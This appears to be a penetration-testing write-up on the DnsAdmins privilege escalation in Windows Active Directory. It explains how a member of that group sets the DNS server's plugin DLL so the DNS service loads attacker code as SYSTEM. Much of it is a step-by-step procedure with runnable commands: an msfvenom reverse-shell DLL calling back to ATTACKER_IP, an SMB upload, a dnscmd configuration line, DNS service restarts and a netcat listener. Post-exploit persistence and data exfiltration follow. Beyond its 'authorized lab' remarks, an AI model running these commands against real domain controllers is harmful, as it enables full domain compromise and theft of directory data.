A user with membership in the **DnsAdmins** group (or with write ACLs on the MicrosoftDNS container / DNS server configuration) can change the DNS server’s plugin DLL (`ServerLevelPluginDll`) so that the DNS service loads an attacker-controlled DLL on service start. Because the DNS service runs as **NT AUTHORITY\SYSTEM**, any code executed inside that DLL runs at SYSTEM privilege, resulting in **local privilege escalation** to SYSTEM and potentially full domain compromise if the server is a Domain Controller.


---

## High-level flow (attack / abuse)

1. Attacker has an account with `DnsAdmins` (or equivalent write permissions to DNS configuration).
    
2. Attacker places a Windows DLL (that implements the DNS plugin interface) on a path readable by the DNS host (local file or UNC share accessible by the machine account).
    
3. Attacker updates the DNS Server plugin configuration to point to the DLL.
    
4. Attacker causes the DNS service to reload/restart.
    
5. DNS service loads the DLL and runs its initialization routine under SYSTEM, enabling arbitrary code runs as SYSTEM.


---

## Exploitation Process

1. **Create malicious DLL payload**  
    Use `msfvenom` (or compile a DLL that implements `DnsPluginInitialize` and spawns a worker thread) to create a DLL that will execute the desired payload (for example, a reverse shell).
    

```bash
# Example (authorized lab only)
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f dll -o evil.dll
```

2. **Make DLL reachable by the DNS host**  
    Upload the DLL to a location the DNS server can read, e.g. a UNC share or a writable local path on the DNS host.
    

```bash
# Example: upload via SMB (authorized lab)
smbclient //TARGET_IP/C$ -U 'dnsadminuser' -c 'put evil.dll C:\Windows\Temp\evil.dll'
# Or host on attacker's SMB: \\ATTACKER_IP\share\evil.dll (ensure DC machine account can read it)
```

3. **Configure DNS server to load the DLL**  
    Use `dnscmd` to point the DNS server to the attacker-controlled DLL.
    

```bat
dnscmd DC01 /config /serverlevelplugindll \\ATTACKER_IP\share\evil.dll
```

4. **Restart or reload the DNS service**  
    Restart the DNS service so it loads the configured plugin DLL. When the service loads the DLL, the DLL’s initialization will run under the service account context (typically SYSTEM).
    

```bat
net stop dns
net start dns
# or via SC:
sc \\DC01 stop dns
sc \\DC01 start dns
```

5. **Receive the callback**  
    The malicious DLL spawns the payload (for example, a reverse shell) and connects back to the attacker. Successful connection typically executes as `NT AUTHORITY\SYSTEM`.
    

```bash
# Listener example (attacker)
nc -lvnp 4444
# or use msfconsole multi/handler
```

6. **Post-exploit actions**
    
    - Verify you are `NT AUTHORITY\SYSTEM` (e.g. `whoami /all`).
        
    - Pivot or escalate further (domain persistence, add privileged accounts, exfiltrate AD data) — only in authorized tests.
